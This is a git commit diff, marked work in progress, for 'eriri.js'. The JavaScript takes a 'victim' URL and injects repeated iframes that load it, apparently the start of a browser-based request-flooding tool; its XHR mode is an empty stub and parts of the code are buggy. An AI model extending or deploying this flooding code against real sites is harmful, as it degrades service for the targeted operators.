642663f389282a859eac1808ca981dd61940b1ca
Pakkapon Phongthawee <me@pureapp.in.th>
2017-04-15 00:04:14 +0700

    [WIP] Iframe

--- src/eriri.js
+++ src/eriri.js
@@ -1,5 +1,21 @@
-var Eriri = function(url,mode){
+var Eriri = function(url,mode,limit,timeout){
   if(!url){
-    throw new Exception("Eriri require url of victim! if not, i will use twin tail to you!");
+  }
+  this.iframe = function(url,limit){
+    const template = "<iframe sandbox src='javascript:window.location.replace(\""+url+"\")'></iframe>";
+    for(var i = 0;i<10;i++){
+      document.body.innerHTML+= template;
+      console.log("create Iframe");
+    }
+  }
+  this.xhr = function(url,limit,req){
+
+  }
+  if(!mode || mode == "xhr"){
+    this.xhr(url);
+  }else if(mode == "iframe"){
+    this.iframe(url);
+  }else{
+    throw new "Do you want to cheat me? why you not choose between xhr or iframe";
   }
 }
